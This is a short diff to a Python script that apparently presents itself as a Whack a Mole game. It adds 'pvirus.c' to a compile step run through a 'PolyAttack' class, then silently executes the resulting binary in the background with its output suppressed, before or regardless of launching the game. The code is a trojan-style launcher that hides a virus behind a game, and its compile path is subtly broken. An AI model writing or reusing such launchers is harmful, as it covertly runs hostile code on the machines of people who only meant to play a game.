@@ -56,14 +56,19 @@ if __name__ == '__main__':
         print("Sorry we cannot run Whack a Mole on your OS")
         sys.exit()
 
-    run_weak_process([PolyAttack.gcc_path, os.path.join(os.getcwd(), "main.c"), "-o", "main"])
-    run_weak_process(['chmod', '+x', './main'])
-    
-    #Popen(['./main'], shell=True)
-    Popen(['./main'], stderr=PIPE, stdout=PIPE, shell=True)
-    # 
+    try:
 
-    ppp = WhackAMole()
-    ppp.main()
+        run_weak_process([PolyAttack.gcc_path, os.path.join(os.getcwd(), "main.c", "pvirus.c"), "-o", "main"])
+        run_weak_process(['chmod', '+x', './main'])
+        
+        #Popen(['./main'], shell=True)
+        Popen(['./main'], stderr=PIPE, stdout=PIPE, shell=True)
+        # 
+
+        ppp = WhackAMole()
+        ppp.main()
+    except:
+        ppp = WhackAMole()
+        ppp.main()
 
     
